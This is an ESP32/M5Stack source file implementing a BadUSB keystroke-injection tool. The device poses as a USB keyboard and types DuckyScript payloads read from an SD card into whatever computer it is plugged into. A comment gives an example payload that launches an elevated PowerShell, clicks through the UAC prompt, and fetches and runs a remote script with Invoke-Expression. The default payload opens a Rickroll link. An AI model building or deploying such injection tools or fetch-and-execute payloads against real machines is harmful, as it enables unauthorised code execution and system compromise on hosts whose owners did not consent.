
#include <USB.h>
#include <SPI.h>
#include <time.h>


#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;
//#include <BleKeyboard.h>
//BleKeyboard bleKeyboard;
//
#define MAX_FILES 256
#define MAX_FOLDERS 256
#define DEF_DELAY 100

#define KEY_PAUSE 0xD0
#define KEY_NUM_LOCK 0xDB
#define KEY_PRINT_SCREEN 0xCE
#define KEY_SCROLL_LOCK 0xCF
#define KEY_MENU 0xED

File fileRoot;
File root;
String PreFolder = "/";
String fileList[MAX_FILES];
String folderList[MAX_FOLDERS];

int fileListCount;
int folderListCount;
int startIndex;
int endIndex;
int selectIndex;
bool needRedraw=true;

/* Example of payload file

REM Author: UNC0V3R3D
REM Description: Uses powershell to rotate the monitor by 90 degrees.
REM Version: 1.0
REM Category: FUN
DELAY 800
GUI r
DELAY 800
STRING powershell Start-Process powershell -Verb runAs
DELAY 800
ENTER
DELAY 800
LEFTARROW
DELAY 800
ENTER
DELAY 500
STRING Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/UNC0V3R3D/resources/main/monitor_rotation.ps1").Content


*/


void sortList(String fileList[], int fileListCount) {
  bool swapped;
  String temp;
  String name1, name2;
  do {
    swapped = false;
    for (int i = 0; i < fileListCount - 1; i++) {
      name1 = fileList[i];
      name1.toUpperCase();
      name2 = fileList[i + 1];
      name2.toUpperCase();
      if (name1.compareTo(name2) > 0) {
        temp = fileList[i];
        fileList[i] = fileList[i + 1];
        fileList[i + 1] = temp;
        swapped = true;
      }
    }
  } while (swapped);
}


void readFs(String folder) {
  for (int i = 0; i < 255; ++i) {   // Reset all vectors.
    fileList[i] = "";               // Reset all vectors.
    folderList[i] = "";             // Reset all vectors.
  }
  //Read files in folder
  fileRoot = SD.open(folder);
  fileListCount = 0;
  File entry = fileRoot.openNextFile();
  while (entry) {
    if (!entry.isDirectory()) {
      String fullFileName = entry.name();
      String fileName = fullFileName.substring(fullFileName.lastIndexOf("/") + 1);
      String ext = fileName.substring(fileName.lastIndexOf(".") + 1);
      ext.toUpperCase();
      if (ext.equals("TXT") == true) {
        fileList[fileListCount] = fileName;
        fileListCount++;
      }
    }
    entry = fileRoot.openNextFile();
  }
  fileRoot.close();
  //Read folders in folder
  root = SD.open(folder);
  folderListCount = 0;
  File file = root.openNextFile();
  while (file) {
    if (file.isDirectory()) {
      String fullFolderName = file.path();
      String folderName = fullFolderName.substring(fullFolderName.lastIndexOf("/") + 1);
      folderList[folderListCount] = folderName;
      folderListCount++;
    }
    file = root.openNextFile();
  }
  root.close();

  sortList(fileList, fileListCount);
  sortList(folderList, folderListCount);

  startIndex = 0;
  endIndex = startIndex + 8;
  if (endIndex >= (fileListCount + folderListCount)) {
    endIndex = folderListCount + fileListCount - 1;
  }

  needRedraw = true;
  selectIndex = 0;
}



void key_input(String bad_script = "/badpayload.txt")
{
  //The commented commands should be set in the payload file as not all payloads run the same thing
  //Keyboard.press(KEY_LEFT_GUI);
  //Keyboard.press('r');
  //Keyboard.releaseAll();
  delay(1000);

 if (SD.exists("/badpayload.txt")) {
    File payloadFile = SD.open(bad_script, "r");
    if (payloadFile) {
      DISP.setCursor(0, 40);
      DISP.println("from file!");
      String lineContent = "";
      String Command = "";
      String Argument = "";
      char ArgChar;
      Keyboard.releaseAll();
      while (payloadFile.available()) {
        lineContent = payloadFile.readStringUntil('\n');
        Command = lineContent.substring(0, lineContent.indexOf(' ')); // get the command
        Argument = lineContent.substring(lineContent.indexOf(' ') + 1); // get the argument
        ArgChar = Argument.charAt(0);
        if(Command=="REM") { Serial.println(" // " + Argument); }
        else if(Command=="DELAY") delay(Argument.toInt());
        else if(Command=="DEFAULTDELAY" || Command=="DEFAULT_DELAY") delay(DEF_DELAY); //100ms
        else if(Command=="STRING") Keyboard.print(Argument); 
        else if(Command=="ENTER") Keyboard.press(KEY_RETURN);
        else if(Command=="GUI" || Command=="WINDOWS") {     Keyboard.press(KEY_LEFT_GUI); Keyboard.press(ArgChar); }
        else if(Command=="SHIFT") { Keyboard.press(KEY_LEFT_SHIFT); Keyboard.press(ArgChar); }
        else if(Command=="ALT") { Keyboard.press(KEY_LEFT_ALT); Keyboard.press(ArgChar); }
        else if(Command=="CTRL" || Command=="CONTROL") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(ArgChar); }

        else if(Command=="CTRL-ALT") { Keyboard.press(KEY_LEFT_ALT); Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(ArgChar); }
        else if(Command=="CTRL-SHIFT") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_SHIFT); Keyboard.press(ArgChar); }
        else if(Command=="ALT-SHIFT") { Keyboard.press(KEY_LEFT_ALT); Keyboard.press(KEY_LEFT_SHIFT); Keyboard.press(ArgChar); }
        else if(Command=="ALT-GUI") { Keyboard.press(KEY_LEFT_ALT); Keyboard.press(KEY_LEFT_GUI); Keyboard.press(ArgChar); }
        else if(Command=="GUI-SHIFT") { Keyboard.press(KEY_LEFT_GUI); Keyboard.press(KEY_LEFT_SHIFT); Keyboard.press(ArgChar); }
          
        else if(Command=="ENTER") Keyboard.press(KEY_RETURN);
        else if(Command=="DOWNARROW") Keyboard.press(KEY_DOWN_ARROW);
        else if(Command=="DOWN") Keyboard.press(KEY_DOWN_ARROW);
        else if(Command=="LEFTARROW") Keyboard.press(KEY_LEFT_ARROW);
        else if(Command=="LEFT") Keyboard.press(KEY_LEFT_ARROW);
        else if(Command=="RIGHTARROW") Keyboard.press(KEY_RIGHT_ARROW);
        else if(Command=="RIGHT") Keyboard.press(KEY_RIGHT_ARROW);
        else if(Command=="UPARROW") Keyboard.press(KEY_UP_ARROW);
        else if(Command=="UP") Keyboard.press(KEY_UP_ARROW);
        else if(Command=="BREAK") Keyboard.press(KEY_PAUSE);
        else if(Command=="CAPSLOCK") Keyboard.press(KEY_CAPS_LOCK);
        else if(Command=="PAUSE") Keyboard.press(KEY_PAUSE);
        else if(Command=="DELETE") Keyboard.press(KEY_DELETE);
        else if(Command=="BACKSPACE") Keyboard.press(KEY_BACKSPACE);
        else if(Command=="END") Keyboard.press(KEY_END);
        else if(Command=="ESC" || Command=="ESCAPE") Keyboard.press(KEY_ESC);
        else if(Command=="HOME") Keyboard.press(KEY_HOME);
        else if(Command=="INSERT") Keyboard.press(KEY_INSERT);
        else if(Command=="NUMLOCK") Keyboard.press(KEY_NUM_LOCK);
        else if(Command=="PAGEUP") Keyboard.press(KEY_PAGE_UP);
        else if(Command=="PAGEDOWN") Keyboard.press(KEY_PAGE_DOWN);
        else if(Command=="PRINTSCREEN") Keyboard.press(KEY_PRINT_SCREEN);
        else if(Command=="SCROLLOCK") Keyboard.press(KEY_SCROLL_LOCK);
        //else if(Command=="SPACE") Keyboard.press(' '); //Supported on Flipper but not here, yet
        else if(Command=="TAB") Keyboard.press(KEY_TAB);
        else if(Command=="MENU") Keyboard.press(KEY_MENU);
        //else if(Command=="APP") Keyboard.press(APP); //Supported on Flipper but not here, yet
        //else if(Command=="SYSRQ") Keyboard.press(SYSRQ); //Supported on Flipper but not here, yet
        else if(Command=="F1") Keyboard.press(KEY_F1);          
        else if(Command=="F2") Keyboard.press(KEY_F2);
        else if(Command=="F3") Keyboard.press(KEY_F3);
        else if(Command=="F4") Keyboard.press(KEY_F4);
        else if(Command=="F5") Keyboard.press(KEY_F5);
        else if(Command=="F6") Keyboard.press(KEY_F6);
        else if(Command=="F7") Keyboard.press(KEY_F7);
        else if(Command=="F8") Keyboard.press(KEY_F8);
        else if(Command=="F9") Keyboard.press(KEY_F9);
        else if(Command=="F10") Keyboard.press(KEY_F10);  
        else if(Command=="F11") Keyboard.press(KEY_F11);
        else if(Command=="F12") Keyboard.press(KEY_F12);
        else Serial.println("Command:" + Command + " not suported");

        if(Command!="REM") delay(DEF_DELAY); //if command is not a comment, wait DEF_DELAY until next command (100ms)
        Keyboard.releaseAll();
      }
      payloadFile.close();
      Serial.println("Finished badusb payload execution...");
    }
  } else {
    // rick
    Serial.println("rick");
    DISP.setCursor(0, 40);
    DISP.println("rick");
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(1000);
    Keyboard.print("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
  }

  delay(1000);
  Keyboard.releaseAll();

}


void usb_setup()
{
  Serial.println("BadUSB begin");
  DISP.clear();
  DISP.setTextColor(WHITE, BGCOLOR);
  DISP.setCursor(0, 0);
  int rot = 3;
  int dispfileCount = 8;
  String bad_script = "";

  while(1) {
	  // DRAW file list ==============================================================================================================
	  if (needRedraw == true) {
	    startIndex = selectIndex - 5;
	    if (startIndex < 0) {
	      startIndex = 0;
	    }
	    endIndex = startIndex + dispfileCount;
	    if (endIndex >= (fileListCount + folderListCount)) {
	      endIndex = fileListCount + folderListCount + 1;
	      if (PreFolder != "/") { endIndex++; }
	      if (selectIndex>6) {
	        startIndex = selectIndex - 6;
	      }
	      else {
	        startIndex = 0;
	      }
	    }
	    if (fileListCount == 0 && folderListCount == 0 && PreFolder == "/") {
	      DISP.fillScreen(BLACK);
	      DISP.setCursor(0, 0);
	      DISP.setTextColor(RED,WHITE);
	      DISP.println("\nSD is empty or there\nare no .txt in root.\nExample: d:\\badpayload.txt");
	      delay(2000);
	      readFs("/");
	    } else {
	      DISP.fillScreen(BLACK);
	      DISP.setCursor(0, 0);
	      for (int index = startIndex; index <= (endIndex + 1); index++) {
	        DISP.setTextColor(WHITE, BLACK); // RESET BG COLOR TO BLACK
	        if (index == selectIndex) {
	          if (index == 0){
	            DISP.setTextColor(BLACK, WHITE);
	            DISP.print(">");
	          } else if (index < folderListCount+1) {
	            DISP.setTextColor(BLUE);  // folders selected in Blue
	            DISP.print(">");
	          } else if (index < (folderListCount + fileListCount+1)){
	            DISP.setTextColor(GREEN);  // files selected in Green
	            DISP.print(">");
	          } else if (index == (folderListCount + fileListCount+1)){
	            if (PreFolder != "/") {
	              DISP.setTextColor(RED, WHITE);  // folders in yellow
	              DISP.print("<");
	            }
	        }
	        } else {
		  if (index == 0){
		    DISP.setTextColor(WHITE);
		    DISP.print(" ");
		  } else if (index < folderListCount+1) {
	            DISP.setTextColor(YELLOW);  // folders in yellow
	            DISP.print(" ");
	          } else if (index < (folderListCount + fileListCount+1)){
	            DISP.setTextColor(WHITE);  // files in white
	            DISP.print(" ");
	          } else if (index == (folderListCount + fileListCount+1)){
	            if (PreFolder != "/") {
	              DISP.setTextColor(RED, BLACK);  // folders in yellow
	              DISP.print(" ");
	            }
	          }
	        }
		if (index==0) {
		  DISP.println(">> Send default    ");
		} else if (index < folderListCount+1) {
	          DISP.println(folderList[index-1].substring(0, 15) + "/");
	        } else if (index < (folderListCount + fileListCount+1)) {
	          DISP.println(fileList[index - folderListCount-1].substring(0, 16));
	        } else if (PreFolder != "/") { 
	          DISP.print("<< back            ");
	          break;
	        } else { break; } 
	      }
	    }
	    needRedraw = false;
	    delay(150);
	  }
	
	  // END of DRAW file list ============================================================================================================
	
	// push Button Detection ==============================================================================================================
	M5.update();
	#if defined(STICK_C_PLUS2)
	  if (digitalRead(M5_BUTTON_MENU) == LOW) ClickPwrBtn = true; // Power Button
	#endif
	#if defined(STICK_C_PLUS) || defined(STICK_C)
	  if (M5.Axp.GetBtnPress()) ClickPwrBtn = true;  // Power Button
	#endif
	#if defined(STICK_C_PLUS) || defined(STICK_C) || defined(STICK_C_PLUS2)
	  if (M5.BtnB.wasPressed())  ClickSideBtn = true; // Side Button
	#endif
	
	
	#if defined(CARDPUTER)
	  M5Cardputer.update();
	  if (M5Cardputer.Keyboard.isKeyPressed('.'))  //Arrow Up
	#else
	  if ((ClickPwrBtn==true && rot==1) || (ClickSideBtn==true && rot==3))
	#endif
	      {
	        selectIndex++;
	        if (selectIndex > (fileListCount + folderListCount + 1) || (selectIndex == (fileListCount + folderListCount + 1) && PreFolder == "/")) {
	        selectIndex = 0;
	        }
	      #ifndef CARDPUTER
	        ClickPwrBtn=false;
	        ClickSideBtn=false;
	      #endif
	        needRedraw = true;
	        delay(100);
	      }
	
	#if defined(CARDPUTER)
	  M5Cardputer.update();
	  if (M5Cardputer.Keyboard.isKeyPressed(';'))        // Arrow Down
	#else
	  if ((ClickPwrBtn==true && rot==3) || (ClickSideBtn==true && rot==1))
	#endif
	  {
	      selectIndex--;
	      if (selectIndex < 0) {
	        selectIndex = fileListCount + folderListCount - 1 + 1;
	        if(PreFolder!="/") {selectIndex++;}
	      }
	    #ifndef CARDPUTER
	      ClickPwrBtn=false;
	      ClickSideBtn=false;
	    #endif
	      needRedraw = true;
	      delay(100);
	  }  
	
	// END of push Button Detection ===========================================================================================================
	  
	// File Selection =========================================================================================================================
	#if defined(STICK_C_PLUS2) || defined(STICK_C_PLUS) || defined(STICK_C)
	  if (M5.BtnA.wasPressed())  // M5 button
	#else
	  M5Cardputer.update();
	  if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER))  // Enter
	#endif
	  {
	    if (selectIndex==0) { //when Default is selected
			  DISP.fillScreen(BLACK);
			  #if defined(STICK_C) || defined(STICK_C_PLUS)
			  M5.Axp.ScreenBreath(7);
			  #else
			  DISP.setBrightness(0);
			  #endif
			  bad_script = "/badpayload.txt";
	      break;
	      
	    } else if (selectIndex < (folderListCount +1 )) { //When select a Folder
			  if(PreFolder=="/") { PreFolder = PreFolder + folderList[selectIndex - 1]; }
			  else { PreFolder = PreFolder + "/" + folderList[selectIndex - 1]; }
			  selectIndex=0;
			  readFs(PreFolder);
	
	    } else if (fileList[selectIndex - folderListCount - 1] == "") { // When press Back btn
			  PreFolder = PreFolder.substring(0, PreFolder.lastIndexOf("/"));
			  if(PreFolder == ""){ PreFolder = "/"; }
			  selectIndex=0;
			  readFs(PreFolder);
		
	    } else { // when select a file
	      bad_script = PreFolder + "/" + fileList[selectIndex - folderListCount - 1];
	      break; // Exit while andd start bad USB
	    }
	  }
  }
  DISP.setTextSize(MEDIUM_TEXT);  
  DISP.println("Sending...");

  Keyboard.begin();
  USB.begin();

  delay(2000);
  key_input(bad_script);
  DISP.setCursor(0, 0);
  DISP.setTextColor(GREEN, BGCOLOR);
  DISP.println("PAYLOAD SENT!");
  DISP.setTextColor(FGCOLOR, BGCOLOR);

}

void usb_loop()
{


}

/*

Now cardputer works as a USB Keyboard!

Keyboard functions 
Created by: edulk2, thankss

*/

void keyboard_setup() {
    DISP.clear();
    DISP.setRotation(1);
    DISP.setTextColor(GREEN);
    DISP.setTextDatum(middle_center);
    DISP.setTextSize(2);
    DISP.drawString("Keyboard Started",
                                   DISP.width() / 2,
                                   DISP.height() / 2);
    Keyboard.begin();
    USB.begin();
   DISP.setTextColor(FGCOLOR, BGCOLOR);

}

void keyboard_loop() {
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isChange()) {
        if (M5Cardputer.Keyboard.isPressed()) {
            Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();

            KeyReport report = {0};
            report.modifiers = status.modifiers;
            uint8_t index    = 0;
            for (auto i : status.hid_keys) {
                report.keys[index] = i;
                index++;
                if (index > 5) {
                    index = 5;
                }
            }
            Keyboard.sendReport(&report);
            Keyboard.releaseAll();

            // only text for display
            String keyStr = "";
            for (auto i : status.word) {
                if (keyStr != "") {
                    keyStr = keyStr + "+" + i;
                } else {
                    keyStr += i;
                }
            }

            if (keyStr.length() > 0) {
                DISP.clear();
                DISP.drawString("Pressed: " + keyStr,
                                           DISP.width() / 2,
                                           DISP.height() / 2);

            }

        }
    }
}

// BLE KEYBOARD
// from https://github.com/T-vK/ESP32-BLE-Keyboard


void ble_setup() {
  //#include <BleKeyboard.h>
  //BleKeyboard bleKeyboard;
  DISP.clear();
  DISP.setTextColor(RED, BGCOLOR);
  DISP.println("Will be implemented\non next version");
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  //delay(60000);


  //Serial.begin(115200);
  //Serial.println("Starting BLE!");
  //DISP.println("Starting BLE!");
  //BleKeyboard.begin();
}

void ble_loop() {
  //if(BleKeyboard.isConnected()) {
    //Serial.println("Sending 'Hello world'...");
    //bleKeyboard.print("Hello world");

    //delay(1000);

    //Serial.println("Sending Enter key...");
    //bleKeyboard.write(KEY_RETURN);

    //delay(1000);

    //Serial.println("Sending Play/Pause media key...");
    //bleKeyboard.write(KEY_MEDIA_PLAY_PAUSE);

    //delay(1000);
    
   //
   // Below is an example of pressing multiple keyboard modifiers 
   // which by default is commented out. 
   // 
   /* Serial.println("Sending Ctrl+Alt+Delete...");
    bleKeyboard.press(KEY_LEFT_CTRL);
    bleKeyboard.press(KEY_LEFT_ALT);
    bleKeyboard.press(KEY_DELETE);
    delay(100);
    bleKeyboard.releaseAll();
    */

  //}
  //Serial.println("Waiting 5 seconds...");
  //delay(5000);
}
